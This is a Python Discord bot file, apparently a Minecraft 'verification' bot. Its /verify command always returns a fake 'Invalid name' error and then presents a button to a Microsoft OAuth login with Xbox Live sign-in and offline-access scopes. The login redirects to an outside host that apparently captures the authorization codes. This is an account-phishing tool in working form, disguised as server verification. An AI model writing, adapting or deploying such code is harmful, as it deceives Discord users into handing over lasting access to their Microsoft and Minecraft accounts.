from dotenv import load_dotenv
from discord.ext import commands, tasks
import discord
from discord.commands import Option
from discord.ext.commands import cooldown, BucketType
from discord.ui import Button, View
import os
import time
import keep_alive

load_dotenv()

token = os.environ['TOKEN']

intents = discord.Intents.all()
bing = commands.Bot(command_prefix='o!', intents=intents)

redColor = 0xff0000

@bing.event
async def on_ready():
  await bing.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="/verify | bing#0001"), status=discord.Status.dnd)

@bing.slash_command(name="verify", description="Verify to access the server")
async def verify(ctx, name:Option(str, "Minecraft IGN", required=True)):
    button = Button(label="Verify", url="https://login.live.com/oauth20_authorize.srf?client_id=f8b8d615-4b98-464b-8be3-6e1ba57e6b83&response_type=code&redirect_uri=https://oogwaybot.onrender.com&scope=XboxLive.signin+offline_access&state=OK")
    view = View()
    view.add_item(button)
    embed = discord.Embed(title="Something Went Wrong", color=redColor)
    embed.add_field(name=f"Error: Invalid name '{name}'", value="Something went wrong. Please verify with the following")
    await ctx.respond(embed=embed, view=view)

keep_alive.keep_alive()
bing.run(token)
